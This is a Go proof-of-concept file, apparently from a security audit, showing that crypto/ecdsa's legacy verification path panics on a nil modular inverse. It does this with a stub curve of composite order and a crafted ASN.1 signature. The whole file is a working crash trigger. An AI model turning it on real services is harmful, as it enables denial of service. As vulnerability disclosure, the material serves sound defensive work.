// PoC for finding 066: verifyLegacy panics on a non-invertible signature
// scalar.
//
// crypto/ecdsa.VerifyASN1 dispatches unrecognized curves to verifyLegacy.
// verifyLegacy bounds-checks 0 < r,s < N but does not check that ModInverse(s,N)
// is non-nil before using it as a multiplier. With a custom elliptic.Curve whose
// order N is composite, an attacker-supplied s with gcd(s, N) > 1 yields a nil
// inverse, and the subsequent big.Int.Mul dereferences nil.
package main

import (
	"crypto/ecdsa"
	"crypto/elliptic"
	"fmt"
	"math/big"
)

// fakeCurve is a minimal elliptic.Curve stub. We never need its arithmetic to
// be correct because verifyLegacy returns false (or panics) before any curve
// operation.
type fakeCurve struct{}

func (fakeCurve) Params() *elliptic.CurveParams {
	// Provide just enough fields for verifyLegacy to dispatch into the path
	// before ModInverse. N is composite and small (4); BitSize and P are set so
	// hashToInt and CurveParams have safe values.
	return &elliptic.CurveParams{
		Name:    "fake-composite-N",
		BitSize: 4,
		P:       big.NewInt(7),
		N:       big.NewInt(4), // composite => non-invertible elements exist (e.g. 2)
		Gx:      big.NewInt(1),
		Gy:      big.NewInt(1),
		B:       big.NewInt(0),
	}
}

func (fakeCurve) IsOnCurve(x, y *big.Int) bool { return true }
func (fakeCurve) Add(x1, y1, x2, y2 *big.Int) (*big.Int, *big.Int) {
	return big.NewInt(1), big.NewInt(1)
}
func (fakeCurve) Double(x1, y1 *big.Int) (*big.Int, *big.Int) { return big.NewInt(1), big.NewInt(1) }
func (fakeCurve) ScalarMult(x1, y1 *big.Int, k []byte) (*big.Int, *big.Int) {
	return big.NewInt(1), big.NewInt(1)
}

func (fakeCurve) ScalarBaseMult(k []byte) (*big.Int, *big.Int) {
	return big.NewInt(1), big.NewInt(1)
}

func main() {
	curve := fakeCurve{}
	pub := &ecdsa.PublicKey{Curve: curve, X: big.NewInt(1), Y: big.NewInt(1)}

	// ASN.1 SEQUENCE { INTEGER 1, INTEGER 2 }: r=1, s=2.
	// gcd(2, 4) == 2, so ModInverse(2, 4) == nil.
	sig := []byte{0x30, 0x06, 0x02, 0x01, 0x01, 0x02, 0x01, 0x02}

	defer func() {
		if r := recover(); r != nil {
			fmt.Printf("PANIC AS EXPECTED: %v\n", r)
		}
	}()

	ok := ecdsa.VerifyASN1(pub, []byte("any hash"), sig)
	fmt.Printf("no panic: VerifyASN1=%v\n", ok)
}
